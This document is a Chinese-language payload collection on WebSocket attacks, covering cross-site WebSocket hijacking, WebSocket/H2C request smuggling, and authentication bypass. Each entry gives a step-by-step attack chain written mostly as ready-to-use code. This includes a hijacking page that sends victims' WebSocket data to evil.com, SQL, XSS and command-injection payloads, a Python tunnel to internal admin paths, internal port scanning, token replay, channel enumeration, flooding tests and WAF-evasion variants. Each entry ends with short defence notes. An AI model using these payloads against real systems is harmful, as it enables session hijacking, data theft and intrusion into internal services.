# WebSocket安全

_3 条 web payload_

### WebSocket跨站劫持(CSWSH)  `ws-hijack`
_利用WebSocket握手阶段缺少Origin验证的漏洞，通过恶意网页建立跨站WebSocket连接。攻击者可劫持受害者的WebSocket会话，窃取实时数据或以受害者身份发送消息。类似于CSRF但针对WebSocket协议。_
子类：**WebSocket劫持** · tags: `WebSocket` `CSWSH` `Origin` `跨站` `会话劫持`

**前置条件：**
- 目标使用WebSocket通信
- WebSocket握手未验证Origin

**攻击链：**

**1. 识别WebSocket端点**
> 搜索WebSocket端点并测试是否接受任意Origin的跨站连接
```
# 从前端代码搜索WebSocket连接
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"

# 浏览器开发者工具检查(Console)
# 在Network标签筛选WS类型请求

# 手动连接测试
websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close

# 检查握手响应中的Origin处理
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Origin: https://evil.com" \
  "https://{TARGET}/ws"
```
**语法解析：**
- `wss://` — WebSocket Secure协议前缀 _keyword_
- `websocat` — WebSocket命令行客户端工具 _command_
- `Origin: https://evil.com` — 测试跨站Origin是否被接受 _header_
- `Sec-WebSocket-Key` — WebSocket握手必需的随机密钥 _header_

**2. 构造跨站劫持POC页面**
> 创建恶意HTML页面利用受害者Cookie建立WebSocket连接并窃取数据
```
<!-- CSWSH攻击页面 -->
<html>
<body>
<h1>WebSocket Cross-Site Hijacking POC</h1>
<div id="output"></div>
<script>
  // 目标WebSocket——浏览器会自动带上Cookie
  var ws = new WebSocket("wss://{TARGET}/ws");
  
  ws.onopen = function() {
    document.getElementById("output").innerHTML += "<p>Connected!</p>";
    // 以受害者身份发送消息
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
  };
  
  ws.onmessage = function(evt) {
    // 窃取WebSocket返回的数据
    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
    // 外带到攻击者服务器
    fetch("https://evil.com/collect", {
      method: "POST",
      body: evt.data
    });
  };
</script>
</body>
</html>
```
**语法解析：**
- `new WebSocket("wss://{TARGET}/ws")` — 浏览器自动附加目标站点的Cookie _function_
- `ws.onmessage` — 接收WebSocket消息——窃取实时数据 _keyword_
- `fetch("https://evil.com/collect")` — 将窃取的数据外带到攻击者服务器 _function_

**3. WebSocket消息注入**
> 通过WebSocket消息注入SQL/XSS/命令注入payload
```
# 如果WebSocket消息被拼入后端查询
# SQL注入
ws.send(JSON.stringify({
  action: "search",
  query: "test\x27 UNION SELECT username,password FROM users--"
}));

# XSS(如果消息被渲染到其他用户页面)
ws.send(JSON.stringify({
  action: "chat",
  message: "<img src=x onerror=alert(document.cookie)>"
}));

# 命令注入
ws.send(JSON.stringify({
  action: "exec",
  target: "127.0.0.1;id"
}));
```
**语法解析：**
- `UNION SELECT username,password` — SQL联合注入提取凭据 _technique_
- `<img src=x onerror=...>` — XSS payload——通过聊天消息注入 _technique_
- `127.0.0.1;id` — 命令注入——分号拼接系统命令 _technique_

**4. WebSocket流量分析脚本**
> Python脚本实时监控WebSocket流量并记录敏感数据
```
# Python WebSocket监听和分析脚本
import asyncio
import websockets
import json

async def monitor():
    uri = "wss://{TARGET}/ws"
    headers = {"Cookie": "{SESSION_COOKIE}"}
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # 发送认证消息
        await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
        
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"[{data.get('type', 'unknown')}] {msg}")
            
            # 记录敏感数据
            if 'password' in msg.lower() or 'token' in msg.lower():
                with open('ws_sensitive.log', 'a') as f:
                    f.write(msg + '\n')

asyncio.run(monitor())
```
**语法解析：**
- `websockets.connect` — Python WebSocket客户端库 _function_
- `extra_headers` — 附加Cookie/Token认证头 _parameter_
- `ws.recv()` — 异步接收WebSocket消息 _function_

**WAF/EDR 绕过变体：**

**绕过Origin验证**
> 通过Origin伪造、子域名、null Origin和子协议绕过WebSocket Origin验证
```
# Origin头伪造(仅在非浏览器环境有效)
websocat "wss://{TARGET}/ws" -H "Origin: https://{TARGET}"

# 子域名绕过
Origin: https://test.{TARGET}  # 如果验证不严格
Origin: https://{TARGET}.evil.com  # 域名后缀混淆

# null Origin(某些浏览器场景)
# 使用data: URI或沙箱iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>">

# 使用WebSocket子协议绕过
Sec-WebSocket-Protocol: graphql-ws, chat
```
**语法解析：**
- `sandbox="allow-scripts"` — 沙箱iframe导致Origin为null _technique_
- `Sec-WebSocket-Protocol` — WebSocket子协议协商头 _header_


**概述：** WebSocket跨站劫持(Cross-Site WebSocket Hijacking, CSWSH)是WebSocket协议特有的安全问题。WebSocket在握手阶段使用HTTP升级请求，浏览器会自动附加Cookie。如果服务端不验证Origin头，攻击者可从恶意网页建立到目标WebSocket服务器的跨站连接，劫持受害者会话。这相当于WebSocket版本的CSRF，但由于WebSocket是双向通信，攻击者还能实时接收返回数据。

**漏洞原理：** 漏洞根因：(1)WebSocket握手是普通HTTP请求，浏览器自动附加Cookie(同CSRF)；(2)服务端未验证请求的Origin头是否为受信任的来源；(3)WebSocket连接建立后不受同源策略限制；(4)CSRF Token通常不会应用于WebSocket握手；(5)WebSocket消息通常不经过WAF检测；(6)某些框架默认接受所有Origin的WebSocket连接。

**利用方法：** 攻击流程：(1)在前端代码中搜索WebSocket连接URL(wss://target/ws)；(2)使用websocat工具测试是否接受跨站Origin；(3)如果接受任意Origin，构造恶意HTML页面，使用new WebSocket()连接目标(浏览器自动附加Cookie)；(4)在ws.onmessage回调中窃取所有返回数据并外带到攻击者服务器；(5)进一步测试WebSocket消息中的注入漏洞(SQL/XSS/命令注入)。

**防御措施：** 防御措施：(1)在WebSocket握手时严格验证Origin头(白名单模式)；(2)使用独立的WebSocket认证令牌(不依赖Cookie)；(3)在WebSocket消息级别实施CSRF Token验证；(4)对WebSocket消息内容进行输入验证和输出编码；(5)使用WSS(WebSocket Secure)加密传输；(6)实施WebSocket消息速率限制防止滥用。

---

### WebSocket走私攻击  `ws-smuggling`
_利用反向代理/负载均衡器对WebSocket协议处理的差异，通过WebSocket升级请求走私HTTP请求到内网服务。攻击者可绕过前端安全控制直接与后端通信，访问受保护的内部API或管理接口。_
子类：**WebSocket走私** · tags: `WebSocket` `走私` `反向代理` `H2C` `内网穿透`

**前置条件：**
- 目标使用反向代理(Nginx/Varnish等)
- 代理允许WebSocket升级
- 后端存在内部服务

**攻击链：**

**1. 检测WebSocket走私可能性**
> 通过Upgrade请求测试反向代理是否存在WebSocket/H2C走私漏洞
```
# 测试Upgrade响应
curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  "https://{TARGET}/"

# 测试H2C走私(HTTP/2 Cleartext)
curl -i -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "https://{TARGET}/"

# 检测代理类型
curl -I "https://{TARGET}/" | grep -iE "server:|via:|x-powered-by:"
```
**语法解析：**
- `Upgrade: websocket` — WebSocket协议升级请求 _header_
- `Upgrade: h2c` — HTTP/2明文协议升级(H2C走私) _header_
- `HTTP2-Settings` — H2C协议升级的必需参数 _header_

**2. WebSocket隧道构造**
> WebSocket升级后通过原始Socket发送走私的HTTP请求访问内部接口
```
# 使用Python构造WebSocket走私
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket握手
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # 走私HTTP请求到内网
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")
```
**语法解析：**
- `Sec-WebSocket-Key` — WebSocket握手密钥(Base64编码) _header_
- `101` — HTTP 101 Switching Protocols——升级成功 _value_
- `Host: 127.0.0.1` — 走私请求指向内网地址 _header_

**3. H2C走私绕过访问控制**
> 使用h2cSmuggler工具通过HTTP/2升级走私访问内网服务和管理接口
```
# h2cSmuggler工具
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://{TARGET}/admin/"

# 手动H2C走私——访问内部API
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://127.0.0.1:8080/api/internal/users"

# 扫描内网端口
for port in 80 8080 8443 9090 3000 5000; do
  python3 h2cSmuggler.py -x "https://{TARGET}" \
    "http://127.0.0.1:$port/" 2>/dev/null && echo "Port $port: OPEN"
done
```
**语法解析：**
- `h2cSmuggler.py` — H2C走私专用工具 _command_
- `-x` — 指定代理/目标地址 _parameter_
- `127.0.0.1:8080` — 通过走私访问的内网服务 _domain_

**4. 反向代理差异利用**
> 利用不同反向代理(Nginx/Varnish/HAProxy)的WebSocket处理差异进行走私
```
# Nginx WebSocket走私
# 如果Nginx配置proxy_pass到后端
# 但未限制Upgrade请求

# 测试反向代理路径差异
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/..;/admin/"

# Varnish缓存投毒+WebSocket
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "X-Forwarded-Host: evil.com" \
  "https://{TARGET}/"

# HAProxy WebSocket走私
# 利用HAProxy在Upgrade后不再检查后续请求
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/" --next -H "Host: internal" "https://{TARGET}/admin/"
```
**语法解析：**
- `/..;/admin/` — 路径穿越——利用代理和后端解析差异 _path_
- `X-Forwarded-Host` — 请求头注入——可能导致缓存投毒 _header_

**WAF/EDR 绕过变体：**

**绕过WAF的WebSocket检测**
> 通过大小写混淆、分块传输和压缩Extension绕过WAF对WebSocket走私的检测
```
# 大小写混淆
Connection: upgrade
Upgrade: WebSocket  # 大小写变体
Upgrade: WEBSOCKET

# 分块传输隐藏走私内容
Transfer-Encoding: chunked
# 在WebSocket帧中嵌入HTTP请求

# 使用WebSocket Extension混淆
Sec-WebSocket-Extensions: permessage-deflate
# 压缩后的恶意消息难以被WAF检测

# 伪装为正常WebSocket流量
# 先发送正常消息，延迟后发送走私请求
```
**语法解析：**
- `permessage-deflate` — WebSocket消息压缩扩展——混淆payload _keyword_
- `Transfer-Encoding: chunked` — 分块传输编码隐藏走私内容 _header_


**概述：** WebSocket走私是一种利用反向代理对WebSocket升级处理差异的高级攻击技术。当代理(如Nginx/HAProxy/Varnish)收到WebSocket升级请求后会建立TCP隧道，此后代理不再检查通过隧道传输的数据。攻击者可在WebSocket隧道中发送任意HTTP请求，绕过前端代理的访问控制直接与后端通信，访问本应受限的内部API和管理接口。

**漏洞原理：** 漏洞根因：(1)反向代理在处理101 Switching Protocols后将连接视为原始TCP隧道，不再进行HTTP层检查；(2)代理对WebSocket Upgrade请求的验证不够严格(可能不验证后端是否真正完成了101响应)；(3)H2C(HTTP/2 Cleartext)升级走私——某些代理处理h2c升级时也会创建不受监控的隧道；(4)代理与后端对同一请求的解析不一致(路径、Host头等)；(5)后端假设所有请求都经过前端代理的安全过滤。

**利用方法：** 攻击路径：(1)检测目标是否经过反向代理(Server/Via头、响应特征)；(2)发送WebSocket Upgrade请求观察代理行为(是否返回101)；(3)如果代理允许升级但后端不是真正的WebSocket服务，可利用隧道发送HTTP请求；(4)在建立的隧道中发送指向127.0.0.1/内网IP的HTTP请求；(5)扫描内网端口和服务；(6)访问内部管理接口和受限API；(7)对于H2C走私使用h2cSmuggler工具自动化测试。

**防御措施：** 防御措施：(1)反向代理仅在后端确认101响应时才建立隧道；(2)禁止对非WebSocket后端的Upgrade请求；(3)在代理层配置WebSocket端点白名单(仅允许特定路径升级)；(4)禁用H2C(http2_push_preload off in Nginx)；(5)后端服务也要实施访问控制，不假设所有请求都经过代理；(6)使用Network Policy/Security Group限制后端可访问的内网范围。

---

### WebSocket认证与授权绕过  `ws-auth-bypass`
_利用WebSocket连接建立后缺少持续认证检查的漏洞，通过会话固定、令牌重放、频道越权订阅等方式绕过认证和授权机制。WebSocket的长连接特性使得权限变更后原连接仍可保持访问。_
子类：**认证绕过** · tags: `WebSocket` `认证` `授权` `越权` `Token重放`

**前置条件：**
- 目标使用WebSocket实时通信
- 已获取有效会话/Token

**攻击链：**

**1. WebSocket认证机制分析**
> 通过Monkey-patch WebSocket对象拦截和分析认证流程
```
# 抓取WebSocket握手和初始消息
# 在浏览器Console中:
const origWS = WebSocket;
window.WebSocket = function(url, protocols) {
  console.log("[WS] Connecting to:", url);
  const ws = new origWS(url, protocols);
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("[WS] SEND:", data);
    origSend(data);
  };
  ws.addEventListener("message", e => console.log("[WS] RECV:", e.data));
  return ws;
};

# 观察认证流程：
# 1. Cookie/Token在握手阶段传递？
# 2. 连接后发送auth消息？
# 3. 是否有心跳保活机制？
```
**语法解析：**
- `window.WebSocket = function` — Monkey-patch WebSocket构造函数 _function_
- `ws.send = function` — 拦截发送的消息用于分析 _function_
- `addEventListener("message")` — 监听接收到的消息 _function_

**2. Token重放与会话固定**
> 测试Token过期后的重放和WebSocket连接在注销后是否仍活跃
```
# 测试Token过期后是否仍可使用
# Step 1: 记录有效Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: 等待Token过期/注销账号
# Step 3: 尝试用旧Token建立WebSocket连接
websocat "wss://{TARGET}/ws" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -5

# 测试WebSocket连接在用户注销后是否仍然活跃
# (WebSocket长连接可能不受HTTP会话注销影响)

# 会话固定——使用他人Token
websocat "wss://{TARGET}/ws" \
  -H "Cookie: session={OTHER_USER_SESSION}"
```
**语法解析：**
- `Authorization: Bearer` — WebSocket握手时的JWT认证 _header_
- `{OTHER_USER_SESSION}` — 测试他人会话Cookie是否可重放 _variable_

**3. 频道/房间越权订阅**
> 测试WebSocket频道/房间的授权控制，尝试越权订阅他人私有频道
```
# 订阅其他用户的私有频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "user.1002.notifications"  // 尝试订阅其他用户
}));

# 订阅管理员频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "admin.dashboard"
}));

# 遍历频道ID
for (let i = 1; i <= 100; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user.${i}.messages`
  }));
}

# 测试频道名注入
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "public.*"  // 通配符订阅
}));
```
**语法解析：**
- `user.1002.notifications` — 其他用户的私有频道——测试越权 _value_
- `admin.dashboard` — 管理员频道——测试垂直越权 _value_
- `public.*` — 通配符订阅——尝试批量接收消息 _technique_

**4. WebSocket速率限制与DoS测试**
> 测试WebSocket的消息速率限制和大小限制
```
# 测试消息速率限制
import asyncio, websockets, json, time

async def rate_test():
    uri = "wss://{TARGET}/ws"
    async with websockets.connect(uri) as ws:
        # 快速发送消息测试速率限制
        start = time.time()
        for i in range(1000):
            await ws.send(json.dumps({"action": "ping", "seq": i}))
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        
        # 大消息测试
        large_msg = "A" * (1024 * 1024)  # 1MB
        try:
            await ws.send(large_msg)
            print("Large message accepted - no size limit!")
        except Exception as e:
            print(f"Large message rejected: {e}")

asyncio.run(rate_test())
```
**语法解析：**
- `range(1000)` — 快速发送1000条消息测试速率限制 _value_
- `"A" * (1024 * 1024)` — 1MB大消息测试大小限制 _value_

**WAF/EDR 绕过变体：**

**绕过WebSocket认证机制**
> 利用协议降级、重连机制和轮询降级绕过WebSocket认证
```
# 使用低权限Token获取高权限WebSocket连接
# 某些实现仅在握手时验证Token，连接后不再检查

# 利用WebSocket重连机制
# 某些客户端实现会在断线后自动重连
# 拦截重连请求替换Token

# 协议降级攻击
# 从wss://降级到ws://(如果后端支持)
websocat "ws://{TARGET}/ws" -H "Cookie: session={TOKEN}"

# 利用Socket.io/SockJS的HTTP降级
curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
```
**语法解析：**
- `ws://` — 非加密WebSocket——可能绕过TLS层的安全检查 _keyword_
- `transport=polling` — Socket.io HTTP长轮询降级 _parameter_


**概述：** WebSocket认证与授权绕过是实时通信应用中常见但容易被忽视的安全问题。与HTTP请求不同，WebSocket建立后是持久连接，许多应用仅在握手阶段验证身份，此后不再检查权限变更。这导致：(1)用户注销后WebSocket连接仍然活跃；(2)Token过期后仍可通信；(3)频道订阅缺少授权检查。聊天应用、实时协作工具、金融行情推送等场景尤为高危。

**漏洞原理：** 漏洞根因：(1)WebSocket仅在握手时进行一次认证，此后不验证权限变更；(2)用户注销/密码修改后，已建立的WebSocket连接不会被主动断开；(3)频道/房间(Channel/Room)的订阅操作缺少服务端授权检查；(4)WebSocket消息缺少签名或防篡改机制；(5)速率限制通常仅应用于HTTP层，WebSocket消息不受限；(6)Socket.io等框架的HTTP轮询降级模式可能绕过WebSocket层的安全控制。

**利用方法：** 攻击流程：(1)使用浏览器开发者工具分析WebSocket认证流程(是Cookie还是Token)；(2)测试Token过期/注销后WebSocket连接是否仍然有效；(3)尝试订阅其他用户的私有频道(IDOR)；(4)尝试订阅管理员频道(垂直越权)；(5)测试WebSocket消息中的注入点(SQL/XSS)；(6)检查是否存在速率限制——无限制可能导致DoS或批量数据爬取。

**防御措施：** 防御措施：(1)在WebSocket消息级别实施持续认证(定期验证Token有效性)；(2)用户注销/权限变更时主动关闭所有WebSocket连接；(3)频道订阅实施服务端授权检查(verify channel ownership)；(4)设置WebSocket消息速率限制和大小限制；(5)使用JWT短有效期(15分钟)并在WebSocket层面实施Token刷新；(6)审计所有WebSocket事件处理器的输入验证。

---
